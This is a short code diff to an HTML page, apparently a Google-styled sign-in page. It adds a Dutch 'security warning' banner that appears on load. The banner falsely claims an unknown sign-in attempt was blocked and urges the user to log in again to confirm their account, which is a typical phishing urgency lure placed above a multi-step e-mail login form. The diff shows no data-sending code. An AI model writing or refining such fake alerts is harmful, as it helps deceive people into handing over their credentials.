@@ -323,6 +323,12 @@
 <body>
 
 <div class="page-wrap">
+    <!-- Urgency banner — shown on load -->
+    <div id="urgentBanner" style="max-width:460px;width:100%;margin:0 auto 16px;background:#fce8e6;border:1px solid #f5c6c4;border-radius:8px;padding:13px 16px;display:flex;gap:12px;align-items:flex-start;font-size:13px;color:#c5221f;line-height:1.5;position:relative;">
+        <svg viewBox="0 0 24 24" width="20" height="20" style="flex-shrink:0;margin-top:1px;"><path fill="#c5221f" d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <div><strong>Beveiligingswaarschuwing</strong><br>Er werd een aanmeldpoging vanuit een onbekende locatie geblokkeerd. Log opnieuw in om je account te bevestigen.</div>
+        <span onclick="this.parentElement.style.display='none'" style="position:absolute;top:8px;right:10px;cursor:pointer;font-size:18px;color:#9aa0a6;line-height:1;">✕</span>
+    </div>
     <div class="card">
 
         <!-- ── STAP 1: E-mail ── -->
